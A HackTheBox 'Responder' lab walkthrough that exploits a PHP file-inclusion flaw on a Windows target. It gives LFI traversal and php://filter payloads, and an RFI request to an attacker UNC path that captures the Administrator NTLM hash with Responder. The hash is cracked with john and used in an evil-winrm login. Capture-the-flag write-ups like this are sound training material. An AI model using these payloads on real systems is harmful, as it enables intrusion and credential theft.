## Responder HackTheBox
#### About Box
Responder is a box that will help you to take the first step towards Windows server exploitation. I like the room because it tought me some new stuffs that I've never new existed.

**`skill needed`**
- Nmap
- Gobuster/ FFUF
- responder
- evil-winrm
- LFI
- RFI
---
#### Step One: Recon
First thing is : `nmap`
```bash
nmap -A -sV --privileged -T4 10.129.121.226  -p- -O -sC -v
```
**`Result`**
|PORT|STATE|SERVICE|VERSION|
|----|----|----|----|
|80/tcp|open|http|Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)|
|5985/tcp|open|http|Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|

Result Description: **`Port 80`**
```terminal
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Unika
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
```

Result Description: **`Port 5985`**
```terminal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```

Then we visit the site and with `wappalyzer` we can see bunch of stuffs about our site. The key features are:
- Running on PHP `8.1.1`
- Running on a Windows OS
- Has Apache server

now since we know what our web site title should be, we will `Fuzz` it for any interesting file/ directory.
```bash
ffuf -u http://unika.htb/FUZZ -w ~/custom-wl/OneListForAll/onelistforallmicro.txt -v -r -c -fc 404,403 -fs 46453
```
I got one:
- http://unika.htb/cgi-bin/printenv.pl
this is kinda weird and reviels internal file structures. This will help us.

Burp automatically discoverd a parameter called **`page=`**. let's take a look at it.

#### Step Two: Exploiting
We discoverd that our found parameter **`page`** loads file from the server. this might help us to get `LFI`. But this is a windows server so we have to use payload that follows windows filesystem.

in this case I've used: `../../../../../../../../windows/system32/drivers/etc/hosts`

and yes we get a `LFI`

**`Result`**
```terminal
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
-------<snip>------
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
```
We can also use **`PHP protocol`** to read internal PHP files as they can not be read from server side.

I've used this one to read the index.php:
```bash
php://filter/convert.base64-encode/resource=index.php
```
After decoding I got:
```php
<?php 
$domain = "unika.htb";
if($_SERVER['SERVER_NAME'] != $domain) {
  echo '<meta http-equiv="refresh" content="0;url=http://unika.htb/">';
  die();
}
if(!isset($_GET['page'])) {
  include("./english.html");
}
else {
  include($_GET['page']);
}       
```
>> More cool tricks are [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#wrapper-phpfilter)

Now we have to get into the server. HTB suggest that we can do it using a tool called `responder`. This will help us to capture the `Administartor Hash` via `RFI`.

To do so, all we have to do is to run `responder` with sudo and listen to `tun0` protocol as we are connected to the machine via VPN.

`sudo responder -I tun0`

after starting it we have to perform the **RFI**. It's not necessary to have a vaild file, all we need is the server to send us a request including the hash. so we will do it like:
```URI
http://unika.htb/index.php?page=//10.10.14.30/hehe.php
```
then we will see our responder got the admin hash which we will decrypt using `john`:

`john --wordlist=rockyou.txt hash.txt`

As we have the password for admin, we will try to get in now.

Remember we have port **5985** open? we will use this one to access. Upon searching, I've come to know that I can access it using `evil-winrm` tool

All you have to do:
`evil-winrm -u Administrator -p 'badminton' -i 10.129.122.152`

And the rest is upto you. 
>>>> Peace

